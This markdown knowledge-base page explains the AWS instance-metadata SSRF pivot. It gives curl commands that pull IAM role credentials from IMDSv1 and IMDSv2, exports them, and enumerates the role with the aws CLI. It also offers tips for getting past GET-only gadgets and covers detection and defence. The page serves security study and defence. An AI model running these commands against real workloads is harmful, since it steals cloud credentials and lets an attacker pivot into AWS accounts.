---
title: AWS IMDS SSRF pivot
slug: aws-imds-ssrf-pivot
---

> **TL;DR:** Any SSRF that can reach `169.254.169.254` from an EC2 host hands you temporary IAM role credentials — IMDSv1 needs one GET, IMDSv2's PUT-token gate is only a real defence when paired with `HttpPutResponseHopLimit=1`.

## What it is
The link-local Instance Metadata Service exposes short-lived STS credentials for the role attached to an EC2 instance, ECS task, or EKS node. A server-side request forgery primitive that reaches that endpoint exfiltrates those credentials and lets the attacker pivot from a single web bug into whatever the role can do — read S3, write Lambda, AssumeRole into other accounts. Blast radius is the union of the instance profile's policies and every role its trust chain admits.

## Preconditions / where it applies
- An SSRF gadget on an EC2/ECS/EKS workload (URL fetcher, PDF renderer, webhook validator, image proxy).
- The instance has an IAM instance profile attached and the role has non-trivial permissions.
- IMDSv1 is still enabled, *or* the SSRF primitive can issue a `PUT` with a custom header so it can mint an IMDSv2 token.
- CloudTrail visibility into `sts:GetCallerIdentity` from off-VPC IPs is not wired into alerting.

## Technique
```bash
# IMDSv1 — one GET hop, no headers
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# IMDSv2 — PUT a token, then GET with the header
TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -sH "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# Export and pivot
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name "$ROLE"
```

For SSRF gadgets stuck on `GET`, look for chains that follow 30x redirects with header preservation, or webhook configurators that let you set arbitrary headers and method. Container workloads use `169.254.170.2` plus `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` — same pivot, different endpoint.

## Detection and defence
- Force IMDSv2 with `HttpTokens=required` *and* set `HttpPutResponseHopLimit=1` so sidecar containers cannot reach IMDS through the pod network.
- VPC endpoint policies and SCPs that deny role use from outside expected source IPs / accounts.
- GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration*` fires when role credentials are used from an IP outside the instance's VPC.
- IAM Access Analyzer for over-privileged instance roles; trim to least-privilege per workload.

## References
- [AWS — Configuring IMDS options](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-options.html) — `HttpTokens` and hop-limit reference.
- [HackingTheCloud — EC2 metadata SSRF](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/) — payloads for v1 and v2.

See also: [[aws-instance-metadata]], [[aws-iam-enum]], [[aws-sts-assume-role]], [[ssrf]], [[token-stealing-cloud]].
